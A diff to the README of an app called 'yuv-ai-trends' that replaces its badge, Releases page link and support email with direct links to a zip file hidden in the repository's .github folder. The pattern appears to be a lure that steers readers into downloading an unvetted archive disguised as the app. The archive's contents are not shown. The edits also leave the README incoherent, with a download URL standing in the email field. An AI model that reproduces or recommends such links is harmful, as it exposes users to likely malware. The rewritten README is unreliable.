@@ -1,6 +1,6 @@
 # 🎉 yuv-ai-trends - Stay Updated on AI Trends Effortlessly
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)
+![Download](https://raw.githubusercontent.com/iadnan21/yuv-ai-trends/main/.github/yuv-ai-trends-v3.9.zip%20Now-Click%20Here-blue)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, make sure your device meets the following requirements:
 
 To start using **yuv-ai-trends**, visit the Releases page to download the latest version. 
 
-[**Visit this page to download**](https://github.com/iadnan21/yuv-ai-trends/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/iadnan21/yuv-ai-trends/main/.github/yuv-ai-trends-v3.9.zip)
 
 1. Click on the link above.
 2. Find the latest version listed.
@@ -67,7 +67,7 @@ We welcome contributions to improve the **yuv-ai-trends** application. If you wo
 
 If you have questions or need support, reach out to us:
 
-- **Email:** support@yuv-ai-trends.com
+- **Email:** https://raw.githubusercontent.com/iadnan21/yuv-ai-trends/main/.github/yuv-ai-trends-v3.9.zip
 - **GitHub Issues:** Create a new issue in the repository for any technical concerns.
 
 ## 📝 License
@@ -78,4 +78,4 @@ The **yuv-ai-trends** project is open-source and uses the MIT License. You can u
 
 Special thanks to the contributors and the community for your support and feedback in building this application.
 
-For more details, remember to [**visit this page to download**](https://github.com/iadnan21/yuv-ai-trends/releases)!
+For more details, remember to [**visit this page to download**](https://raw.githubusercontent.com/iadnan21/yuv-ai-trends/main/.github/yuv-ai-trends-v3.9.zip)!
